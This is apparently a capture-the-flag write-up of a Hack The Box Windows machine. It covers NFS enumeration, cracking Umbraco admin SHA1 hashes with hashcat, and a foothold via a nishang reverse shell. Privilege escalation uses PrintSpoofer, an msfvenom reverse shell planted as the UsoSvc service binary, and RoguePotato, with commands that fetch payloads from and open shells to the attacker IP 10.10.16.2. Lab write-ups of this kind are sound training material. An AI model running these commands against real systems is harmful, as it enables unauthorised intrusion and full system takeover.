# Enumeration 

## open ports

```

21/tcp   open  ftp           Microsoft ftpd                                                                                            
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                 
| ftp-syst:                                                                                                                            
|_  SYST: Windows_NT                                                                                                                   
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                   
| http-methods:                                                                                                                        
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                           
|_http-title: Home - Acme Widgets                                                                                                      
111/tcp  open  rpcbind       2-4 (RPC #100000)

135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Port 2049

was able to mount NFS 
![[Pasted image 20230126001324.png]]


![[Pasted image 20230126010234.png]]

`strings Umbraco.sdf`
![[Pasted image 20230126011126.png]]
found emails with SHA1 passwords
` .\hashcat.exe -m 100 .\hash.txt .\rockyou.txt -O`
![[Pasted image 20230126011452.png]]
admin@htb.local:baconandcheese

### Port 80

![[Pasted image 20230126001110.png]]

![[Pasted image 20230126011752.png]]
# Foothold 
we are in as umbraco admin
![[Pasted image 20230126013608.png]]


Umbraco version 7.12.4

![[Pasted image 20230126040155.png]]

changing values to the right ones
and copying nishang Invoke-PowerShellTCP.ps1 script renaming it to shell.ps1

![[Pasted image 20230126040303.png]]
add this to the last line inside nishang shell
![[Pasted image 20230126040402.png]]

# Privesc 

![[Pasted image 20230126040415.png]]
![[Pasted image 20230126040436.png]]
it's Windows server 2019 so juicy potato won't work we can try rouge potato or print spoofer

```
cd C:\Windows\System32\spool\drivers\color
IWR -Uri http://10.10.16.2/nc.exe -OutFile nc.exe
IWR -Uri http://10.10.16.2/sp.exe -OutFile sp.exe
.\sp.exe -c "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.2 443 -e cmd"
```
![[Pasted image 20230126042015.png]]

![[Pasted image 20230126042022.png]]


# Alternative root
running winpeas 
![[Pasted image 20230126043440.png]]

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=8002 -f exe > shell-x64.exe
IWR -Uri http://10.10.16.2/shell-x64.exe -outfile shell-x64.exe
cmd.exe /c 'sc config UsoSvc binpath= "C:\Windows\System32\spool\drivers\color\shell-x64.exe"'
cmd.exe /c "sc stop UsoSvc"
cmd.exe /c "sc start UsoSvc"
```
![[Pasted image 20230126045508.png]]
![[Pasted image 20230126045530.png]]

# RougePotato


```
IWR -Uri http://10.10.16.2/rp.exe -outfile rp.exe
cmd /c 'whoami & C:\Windows\System32\spool\drivers\color\rp.exe -r 10.10.16.2 -e "C:\Windows\System32
\spool\drivers\color\shell-x64.exe" -l 9999 
```
![[Pasted image 20230126050559.png]]

![[Pasted image 20230126050606.png]]
# Loot

Umbraco admin creds:
	username: `admin@htb.local`
	password: `baconandcheese`


---
Tags:
Resources: 